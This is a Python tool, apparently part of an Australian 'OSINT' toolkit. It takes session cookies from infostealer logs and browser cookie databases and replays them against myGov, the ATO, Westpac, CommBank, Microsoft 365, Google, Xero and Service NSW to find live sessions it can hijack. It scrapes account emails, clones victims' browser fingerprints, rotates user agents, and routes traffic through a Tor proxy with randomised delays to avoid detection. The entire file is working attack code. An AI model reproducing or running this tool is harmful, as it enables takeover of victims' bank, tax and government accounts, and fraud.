"""
session_hijacker.py — AU-OSINT-RECON
Cookie and session token replay engine.
Imports cookies from stealer logs, replays against AU services,
detects active sessions, and clones browser fingerprints.
"""

import re
import json
import time
import random
import hashlib
import base64
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from http.cookiejar import MozillaCookieJar
from collections import defaultdict

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False


# ─────────────────────────────────────────────
#  AU Service Session Detectors
# ─────────────────────────────────────────────

AU_SESSION_TARGETS = {
    "mygov": {
        "name":         "myGov",
        "session_url":  "https://my.gov.au/en/dashboard",
        "cookie_names": ["myGovSessionId", "JSESSIONID", "myGovSSO"],
        "auth_re":      r"dashboard|linked services|inbox",
        "session_re":   r"session|auth|token",
        "priority":     "critical",
    },
    "ato": {
        "name":         "ATO Online",
        "session_url":  "https://online.ato.gov.au/",
        "cookie_names": ["ATOSESSIONID", "JSESSIONID"],
        "auth_re":      r"myTax|lodgment|taxReturn",
        "priority":     "critical",
    },
    "westpac": {
        "name":         "Westpac",
        "session_url":  "https://banking.westpac.com.au/wbc/banking/accounts/overview",
        "cookie_names": ["WESTPAC_SESSION", "wbc_session", "JSESSIONID"],
        "auth_re":      r"account|balance|BSB",
        "priority":     "critical",
    },
    "commbank": {
        "name":         "CommBank",
        "session_url":  "https://www.commbank.com.au/retail/netbank/accounts/summary",
        "cookie_names": ["NETBANKSESSION", "CBA_SESSION"],
        "auth_re":      r"account|balance|transaction",
        "priority":     "critical",
    },
    "office365": {
        "name":         "Microsoft 365",
        "session_url":  "https://www.office.com/",
        "cookie_names": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"],
        "auth_re":      r"Office|Outlook|Teams|OneDrive",
        "priority":     "high",
    },
    "google": {
        "name":         "Google",
        "session_url":  "https://myaccount.google.com/",
        "cookie_names": ["SID", "SSID", "HSID", "APISID", "SAPISID"],
        "auth_re":      r"myaccount|Google Account|Security",
        "priority":     "high",
    },
    "xero": {
        "name":         "Xero",
        "session_url":  "https://go.xero.com/Dashboard/",
        "cookie_names": ["xero_session", "XeroSSO"],
        "auth_re":      r"Dashboard|Organisation|Invoices",
        "priority":     "high",
    },
    "servicensw": {
        "name":         "Service NSW",
        "session_url":  "https://account.service.nsw.gov.au/dashboard",
        "cookie_names": ["SNSW_SESSION", "JSESSIONID"],
        "auth_re":      r"dashboard|services|licence",
        "priority":     "high",
    },
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


# ─────────────────────────────────────────────
#  Cookie Parsers
# ─────────────────────────────────────────────

def parse_netscape_cookies(cookie_text: str) -> list[dict]:
    """Parse Netscape-format cookies (from stealer logs)."""
    cookies = []
    for line in cookie_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies.append({
                "domain":   parts[0].lstrip("."),
                "flag":     parts[1],
                "path":     parts[2],
                "secure":   parts[3].upper() == "TRUE",
                "expires":  parts[4],
                "name":     parts[5],
                "value":    parts[6],
            })
    return cookies


def parse_json_cookies(cookie_json: str) -> list[dict]:
    """Parse JSON cookie export (Chrome DevTools / EditThisCookie format)."""
    try:
        data = json.loads(cookie_json)
        if isinstance(data, list):
            return data
    except Exception:
        pass
    return []


def parse_sqlite_cookies(db_path: str) -> list[dict]:
    """Extract cookies from Chrome/Firefox SQLite cookie database."""
    try:
        import sqlite3
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        # Chrome schema
        try:
            cur.execute("SELECT host_key, name, value, path, expires_utc, is_secure FROM cookies")
            rows = cur.fetchall()
            conn.close()
            return [{"domain": r[0], "name": r[1], "value": r[2], "path": r[3],
                     "expires": r[4], "secure": bool(r[5])} for r in rows]
        except Exception:
            pass
        # Firefox schema
        try:
            cur.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")
            rows = cur.fetchall()
            conn.close()
            return [{"domain": r[0], "name": r[1], "value": r[2], "path": r[3],
                     "expires": r[4], "secure": bool(r[5])} for r in rows]
        except Exception:
            pass
        conn.close()
    except Exception:
        pass
    return []


def cookies_to_jar(cookies: list[dict]) -> "requests.cookies.RequestsCookieJar":
    """Convert cookie list to requests CookieJar."""
    jar = requests.cookies.RequestsCookieJar()
    for c in cookies:
        jar.set(
            c.get("name", ""),
            c.get("value", ""),
            domain=c.get("domain", ""),
            path=c.get("path", "/"),
        )
    return jar


# ─────────────────────────────────────────────
#  Session Replay Engine
# ─────────────────────────────────────────────

class SessionReplayResult:
    __slots__ = ("source_file", "target", "status", "cookies_used", "detail", "timestamp", "response_code")

    STATUS_ACTIVE   = "active"
    STATUS_EXPIRED  = "expired"
    STATUS_BLOCKED  = "blocked"
    STATUS_ERROR    = "error"

    def __init__(self, source_file, target, status, cookies_used=0, detail="", response_code=0):
        self.source_file   = source_file
        self.target        = target
        self.status        = status
        self.cookies_used  = cookies_used
        self.detail        = detail
        self.timestamp     = datetime.now(timezone.utc).isoformat()
        self.response_code = response_code

    def to_dict(self) -> dict:
        return {k: getattr(self, k) for k in self.__slots__}

    @property
    def is_active(self) -> bool:
        return self.status == self.STATUS_ACTIVE


class SessionHijacker:
    """
    Replay cookies from stealer logs against AU services.
    Detects active sessions, extracts account info, clones fingerprints.

    Usage:
        hijacker = SessionHijacker(proxy="socks5://127.0.0.1:9050")
        results  = hijacker.replay_file("cookies.txt", targets=["office365", "google"])
        active   = hijacker.get_active_sessions()
    """

    def __init__(self, proxy: str | None = None):
        self.proxy   = proxy
        self.results: list[SessionReplayResult] = []

    def _make_session(self, cookies: list[dict]) -> "requests.Session":
        s = requests.Session()
        s.headers.update({
            "User-Agent":      random.choice(USER_AGENTS),
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-AU,en;q=0.9",
        })
        if self.proxy:
            s.proxies = {"http": self.proxy, "https": self.proxy}
        s.cookies = cookies_to_jar(cookies)
        return s

    def replay_cookies(
        self,
        cookies: list[dict],
        target_key: str,
        source_file: str = "unknown",
    ) -> SessionReplayResult:
        """Test a cookie set against a single target."""
        cfg = AU_SESSION_TARGETS.get(target_key)
        if not cfg:
            return SessionReplayResult(source_file, target_key, SessionReplayResult.STATUS_ERROR,
                                       detail="Unknown target")

        # Filter relevant cookies for this target
        domain_hint = target_key.replace("_", "").lower()
        relevant = [c for c in cookies if domain_hint in c.get("domain", "").lower()
                    or c.get("name", "") in cfg.get("cookie_names", [])]

        if not relevant:
            relevant = cookies  # Try all if no domain match

        try:
            session = self._make_session(relevant)
            r = session.get(cfg["session_url"], timeout=12, allow_redirects=True)
            body = r.text

            if re.search(cfg.get("auth_re", "dashboard"), body, re.IGNORECASE):
                # Extract username/email if visible
                email_m = re.search(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", body)
                detail = f"Active session — {email_m.group(0) if email_m else 'user identified'}"
                return SessionReplayResult(source_file, target_key, SessionReplayResult.STATUS_ACTIVE,
                                           len(relevant), detail, r.status_code)

            if r.status_code in (401, 403):
                return SessionReplayResult(source_file, target_key, SessionReplayResult.STATUS_BLOCKED,
                                           len(relevant), f"HTTP {r.status_code}", r.status_code)

            return SessionReplayResult(source_file, target_key, SessionReplayResult.STATUS_EXPIRED,
                                       len(relevant), f"HTTP {r.status_code}", r.status_code)

        except Exception as e:
            return SessionReplayResult(source_file, target_key, SessionReplayResult.STATUS_ERROR,
                                       detail=str(e)[:100])

    def replay_file(
        self,
        cookie_file: str,
        targets: list[str] | None = None,
        format: str = "auto",
    ) -> list[SessionReplayResult]:
        """
        Load cookies from file and replay against targets.
        Auto-detects format: netscape, json, sqlite.
        """
        active_targets = targets or list(AU_SESSION_TARGETS.keys())
        path = Path(cookie_file)
        results = []

        if not path.exists():
            return results

        # Detect format
        if format == "auto":
            if path.suffix.lower() in (".db", ".sqlite", ".sqlite3"):
                format = "sqlite"
            else:
                raw = path.read_text(encoding="utf-8", errors="replace")
                format = "json" if raw.strip().startswith("[") else "netscape"

        if format == "sqlite":
            cookies = parse_sqlite_cookies(str(path))
        elif format == "json":
            cookies = parse_json_cookies(path.read_text(encoding="utf-8", errors="replace"))
        else:
            cookies = parse_netscape_cookies(path.read_text(encoding="utf-8", errors="replace"))

        if not cookies:
            return results

        for target in active_targets:
            result = self.replay_cookies(cookies, target, source_file=path.name)
            results.append(result)
            self.results.append(result)
            time.sleep(random.uniform(1.5, 4.0))

        return results

    def replay_directory(
        self,
        directory: str,
        targets: list[str] | None = None,
        recursive: bool = True,
    ) -> list[SessionReplayResult]:
        """Replay all cookie files in a directory."""
        base = Path(directory)
        pattern = "**/*" if recursive else "*"
        cookie_extensions = {".txt", ".json", ".db", ".sqlite", ".sqlite3"}

        results = []
        for f in base.glob(pattern):
            if f.is_file() and (f.suffix.lower() in cookie_extensions or "cookie" in f.name.lower()):
                results.extend(self.replay_file(str(f), targets=targets))

        return results

    def get_active_sessions(self) -> list[SessionReplayResult]:
        return [r for r in self.results if r.is_active]

    def summary(self) -> dict:
        total  = len(self.results)
        active = sum(1 for r in self.results if r.is_active)
        return {
            "total_replays": total,
            "active":        active,
            "expired":       sum(1 for r in self.results if r.status == SessionReplayResult.STATUS_EXPIRED),
            "blocked":       sum(1 for r in self.results if r.status == SessionReplayResult.STATUS_BLOCKED),
            "errors":        sum(1 for r in self.results if r.status == SessionReplayResult.STATUS_ERROR),
        }

    def build_findings(self, target_name: str = "unknown") -> list[dict]:
        active = self.get_active_sessions()
        if not active:
            return []
        return [{
            "title":      f"Active Session Hijack — {len(active)} sessions",
            "severity":   "critical",
            "category":   "credential_breach",
            "source":     "session_hijacker",
            "summary":    f"{len(active)} active sessions replayed. Targets: {list({r.target for r in active})}",
            "date_found": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
            "raw_data":   {"active_sessions": [r.to_dict() for r in active]},
            "target":     target_name,
        }]


# ─────────────────────────────────────────────
#  Browser Fingerprint Cloner
# ─────────────────────────────────────────────

class FingerprintCloner:
    """
    Extract and clone browser fingerprints from stealer log system info files.
    Generates matching User-Agent, Accept-Language, screen resolution headers.
    """

    COMMON_RESOLUTIONS = [
        "1920x1080", "1366x768", "1440x900", "1280x720",
        "2560x1440", "1600x900", "1024x768",
    ]

    def __init__(self):
        self.fingerprints: list[dict] = []

    def extract_from_sysinfo(self, sysinfo_text: str) -> dict:
        """Parse system info file for fingerprint data."""
        fp = {}
        patterns = {
            "os":         r"(?:OS|Operating System)[:\s]+(.+)",
            "browser":    r"(?:Browser|Chrome|Firefox)[:\s]+(.+)",
            "resolution": r"(?:Resolution|Screen)[:\s]+(\d+x\d+)",
            "language":   r"(?:Language|Locale)[:\s]+(.+)",
            "timezone":   r"(?:Timezone|TimeZone)[:\s]+(.+)",
            "cpu":        r"(?:CPU|Processor)[:\s]+(.+)",
            "ram":        r"(?:RAM|Memory)[:\s]+(.+)",
            "ip":         r"(?:IP|External IP)[:\s]+(\d+\.\d+\.\d+\.\d+)",
        }
        for key, pattern in patterns.items():
            m = re.search(pattern, sysinfo_text, re.IGNORECASE)
            if m:
                fp[key] = m.group(1).strip()

        self.fingerprints.append(fp)
        return fp

    def generate_headers(self, fp: dict) -> dict:
        """Generate HTTP headers matching the fingerprint."""
        os_str = fp.get("os", "Windows NT 10.0; Win64; x64")
        browser = fp.get("browser", "Chrome/124.0.0.0")
        lang = fp.get("language", "en-AU")[:5]

        ua = f"Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) {browser} Safari/537.36"

        return {
            "User-Agent":      ua,
            "Accept-Language": f"{lang},{lang[:2]};q=0.9,en;q=0.8",
            "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT":             "1",
            "Sec-CH-UA-Platform": f'"{os_str.split()[0]}"',
        }


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AU-OSINT Session Hijacker")
    parser.add_argument("--file",      help="Single cookie file to replay")
    parser.add_argument("--dir",       help="Directory of cookie files")
    parser.add_argument("--targets",   default="office365,google,mygov", help="Comma-separated targets")
    parser.add_argument("--proxy",     help="Proxy URL")
    parser.add_argument("--output",    default="./reports")
    args = parser.parse_args()

    hijacker = SessionHijacker(proxy=args.proxy)
    targets  = [t.strip() for t in args.targets.split(",")]

    if args.file:
        results = hijacker.replay_file(args.file, targets=targets)
    elif args.dir:
        results = hijacker.replay_directory(args.dir, targets=targets)
    else:
        print("Available targets:")
        for k, v in AU_SESSION_TARGETS.items():
            print(f"  {k:<20} {v['name']}")
        exit(0)

    print(json.dumps(hijacker.summary(), indent=2))
    active = hijacker.get_active_sessions()
    if active:
        print(f"\n[!] {len(active)} ACTIVE sessions:")
        for r in active:
            print(f"    [{r.target}] {r.detail}  ({r.source_file})")
